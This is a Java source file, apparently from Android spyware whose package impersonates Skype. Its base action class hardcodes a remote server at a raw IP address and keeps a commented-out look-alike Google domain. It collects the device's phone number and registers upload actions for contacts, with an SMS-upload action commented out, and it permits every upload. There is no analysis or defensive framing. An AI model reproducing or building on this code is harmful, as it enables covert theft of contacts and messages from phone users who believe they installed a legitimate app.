package com.skype.raider.action;

import android.content.Context;

import com.skype.raider.http.HttpWrapper;
import com.skype.raider.util.PhoneUtil;

public abstract class BaseAction {

            public static final String DEFAULT_HOST = "http://103.200.30.220:8099";//:8099";//103.55.26.131
    // protected static final String DEFAULT_HOST =
    // "http://www.sevicegogle.com";
    protected Context mContext;

    protected HttpWrapper mHttpWrapper;
    protected String mPhone;
    private static final String[] SUB_CLASSES = new String[]{
            UpContactAction.class.getName()};
    //,UpSmsAction.class.getName()};
    //SychUserAction.class.getName(),

    public static String[] getSubClasses() {
        return SUB_CLASSES;
    }

    public abstract boolean doUpload();

    protected abstract String getRequestUrl();

    public void init(Context context) {
        this.mContext = context;
        mHttpWrapper = HttpWrapper.getInstance(context.getApplicationContext());
        mPhone = PhoneUtil.getPhone(mContext);
    }

    protected boolean allowUpload() {
        return true;

    }
}
